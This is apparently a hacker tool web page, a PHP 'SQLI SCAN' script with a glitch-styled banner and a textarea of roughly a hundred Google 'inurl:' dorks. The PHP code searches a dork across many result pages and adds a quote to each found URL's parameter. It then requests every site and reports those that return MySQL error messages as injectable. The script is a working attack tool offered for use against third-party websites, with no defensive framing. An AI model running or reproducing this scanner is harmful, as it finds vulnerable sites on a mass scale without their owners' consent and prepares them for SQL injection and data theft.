<html>
    <head>
    <title>sqli dork</title>
    <style>
@import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
body {
  background: black;
}

svg {
  width: 600px;
  height: 120px;
  display: block;
  position: relative;
  overflow: hidden;
  margin: 0 auto;
  background: black;
}        

    </style>
    </head>
    <body>
     <svg version="1.1" id="Ebene_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"      width="600px" height="100px" viewBox="0 0 600 100">
     <style type="text/css"><![CDATA[    text {        filter: url(#filter);        fill: white;        font-family: 'Share Tech Mono', sans-serif;        font-size: 100px;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;            }]]>
         
     </style>
         <defs>
                 <filter id="filter">            <feFlood flood-color="black" result="black" />            <feFlood flood-color="red" result="flood1" />            <feFlood flood-color="limegreen" result="flood2" />            <feOffset in="SourceGraphic" dx="3" dy="0" result="off1a"/>            <feOffset in="SourceGraphic" dx="2" dy="0" result="off1b"/>            <feOffset in="SourceGraphic" dx="-3" dy="0" result="off2a"/>            <feOffset in="SourceGraphic" dx="-2" dy="0" result="off2b"/>            <feComposite in="flood1" in2="off1a" operator="in"  result="comp1" />            <feComposite in="flood2" in2="off2a" operator="in" result="comp2" />            <feMerge x="0" width="100%" result="merge1">                <feMergeNode in = "black" />                <feMergeNode in = "comp1" />                <feMergeNode in = "off1b" />                <animate                     attributeName="y"                     id = "y"                    dur ="4s"                                        values = '104px; 104px; 30px; 105px; 30px; 2px; 2px; 50px; 40px; 105px; 105px; 20px; 6ßpx; 40px; 104px; 40px; 70px; 10px; 30px; 104px; 102px'                    keyTimes = '0; 0.362; 0.368; 0.421; 0.440; 0.477; 0.518; 0.564; 0.593; 0.613; 0.644; 0.693; 0.721; 0.736; 0.772; 0.818; 0.844; 0.894; 0.925; 0.939; 1'                    repeatCount = "indefinite" />                 <animate attributeName="height"                     id = "h"                     dur ="4s"                                        values = '10px; 0px; 10px; 30px; 50px; 0px; 10px; 0px; 0px; 0px; 10px; 50px; 40px; 0px; 0px; 0px; 40px; 30px; 10px; 0px; 50px'                    keyTimes = '0; 0.362; 0.368; 0.421; 0.440; 0.477; 0.518; 0.564; 0.593; 0.613; 0.644; 0.693; 0.721; 0.736; 0.772; 0.818; 0.844; 0.894; 0.925; 0.939; 1'                    repeatCount = "indefinite" />            </feMerge>                        <feMerge x="0" width="100%" y="60px" height="65px" result="merge2">                <feMergeNode in = "black" />                <feMergeNode in = "comp2" />                <feMergeNode in = "off2b" />                <animate attributeName="y"                     id = "y"                    dur ="4s"                    values = '103px; 104px; 69px; 53px; 42px; 104px; 78px; 89px; 96px; 100px; 67px; 50px; 96px; 66px; 88px; 42px; 13px; 100px; 100px; 104px;'                     keyTimes = '0; 0.055; 0.100; 0.125; 0.159; 0.182; 0.202; 0.236; 0.268; 0.326; 0.357; 0.400; 0.408; 0.461; 0.493; 0.513; 0.548; 0.577; 0.613; 1'                    repeatCount = "indefinite" />                 <animate attributeName="height"                     id = "h"                    dur = "4s"                                        values = '0px; 0px; 0px; 16px; 16px; 12px; 12px; 0px; 0px; 5px; 10px; 22px; 33px; 11px; 0px; 0px; 10px'                    keyTimes = '0; 0.055; 0.100; 0.125; 0.159; 0.182; 0.202; 0.236; 0.268; 0.326; 0.357; 0.400; 0.408; 0.461; 0.493; 0.513;  1'                                         repeatCount = "indefinite" />            </feMerge>                        <feMerge>                <feMergeNode in="SourceGraphic" />                  <feMergeNode in="merge1" />             <feMergeNode in="merge2" />            </feMerge>        </filter>    </defs><g>    <text x="0" y="100">SQLI SCAN</text></g></svg>
    <body>
     
     <center>
    <form method="post" action="">
    <font color='red'>PUT YOUR DORK FOR SEARCH HERE:</font><input type="text"  name="dork" size="40"/>
    <input type="submit" name="scan" value="Scan">
    </form>
    <textarea rows="4" cols="50" name="comment" form="usrform">
inurl:iniziativa.php?in=
inurl:curriculum.php?id=
inurl:labels.php?id=
inurl:story.php?id=
inurl:look.php?ID=
inurl:newsone.php?id=
inurl:aboutbook.php?id=
inurl:material.php?id=
inurl:opinions.php?id=
inurl:announce.php?id=
inurl:rub.php?idr=
inurl:galeri_info.php?l=
inurl:tekst.php?idt=
inurl:newscat.php?id=
inurl:newsticker_info.php?idn=
inurl:rubrika.php?idr=
inurl:rubp.php?idr=
inurl:offer.php?idf=
inurl:art.php?idm=
inurl:title.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
inurl:play_old.php?id=
inurl:declaration_more.php?decl_id=
inurl:pageid=
inurl:games.php?id=
inurl:page.php?file=
inurl:newsDetail.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num=
inurl:readnews.php?id=
inurl:top10.php?cat=
inurl:historialeer.php?num=
inurl:reagir.php?num=
inurl:Stray-Questions-View.php?num=
inurl:forum_bds.php?num=
inurl:game.php?id=
inurl:view_product.php?id=
inurl:newsone.php?id=
inurl:sw_comment.php?id=
inurl:news.php?id=
inurl:avd_start.php?avd=
inurl:event.php?id=
inurl:product-item.php?id=
inurl:sql.php?id=
inurl:news_view.php?id=
inurl:select_biblio.php?id=
inurl:humor.php?id=
inurl:aboutbook.php?id=
inurl:ogl_inet.php?ogl_id=
inurl:fiche_spectacle.php?id=
inurl:communique_detail.php?id=
inurl:sem.php3?id=
inurl:kategorie.php4?id=
inurl:news.php?id=
inurl:index.php?id=
inurl:faq2.php?id=
inurl:show_an.php?id=
inurl:preview.php?id=
inurl:loadpsb.php?id=
inurl:opinions.php?id=
inurl:spr.php?id=
inurl:pages.php?id=
inurl:announce.php?id=
inurl:clanek.php4?id=
inurl:participant.php?id=
inurl:download.php?id=
inurl:main.php?id=
inurl:review.php?id=
inurl:chappies.php?id=
inurl:read.php?id=
inurl:prod_detail.php?id=
inurl:viewphoto.php?id=
inurl:article.php?id=
inurl:person.php?id=
inurl:productinfo.php?id=
inurl:showimg.php?id=
inurl:view.php?id=
inurl:website.php?id=
inurl:hosting_info.php?id=
inurl:gallery.php?id=
inurl:rub.php?idr=
inurl:view_faq.php?id=
inurl:artikelinfo.php?id=
inurl:detail.php?ID=
inurl:index.php?=
inurl:profile_view.php?id=
inurl:category.php?id=
inurl:publications.php?id=
inurl:fellows.php?id=
inurl:downloads_info.php?id=
inurl:prod_info.php?id=
inurl:shop.php?do=part&id=
inurl:productinfo.php?id=
inurl:collectionitem.php?id=
inurl:band_info.php?id=
inurl:product.php?id=
inurl:releases.php?id=
inurl:ray.php?id=
inurl:produit.php?id=
inurl:pop.php?id=
inurl:shopping.php
    </textarea>
    </center>
     
    <?php
    ob_start();
    set_time_limit(0);
     
    if (isset($_POST['scan'])) {
     
    $first = "startgoogle.startpagina.nl/index.php?q=";
    $sec = "&start=";
    $reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';
     
    for($id=0 ; $id<=30; $id++){
    $page=$id*10;
    $dork=urlencode($_POST['dork']);
    $url = $first.$dork.$sec.$page;
     
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)');
    $result = curl_exec($curl);
    curl_close($curl);
     
    preg_match_all($reg,$result,$matches);
     
    foreach($matches[1] as $site){
     
    $url = preg_replace("/=/", "='", $site);
    $curl=curl_init();
    curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($curl,CURLOPT_URL,$url);
    curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0E)');
    curl_setopt($curl,CURLOPT_TIMEOUT,'5');
    $GET=curl_exec($curl);
    if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) {
    echo '<center><b><font color="#E10000">Found : <a href="'.$url.'">'.$url.'</a></b></font></center>';
    ob_flush();flush();
    }else{
    echo '<center><font color="#FFFF00"><b>'.$url.'</b></font></center>';
    ob_flush();flush();
    }
     
    ob_flush();flush();
    }
    ob_flush();flush();
    }
    ob_flush();flush();
    }
     
    ?>
    </body>
    </html>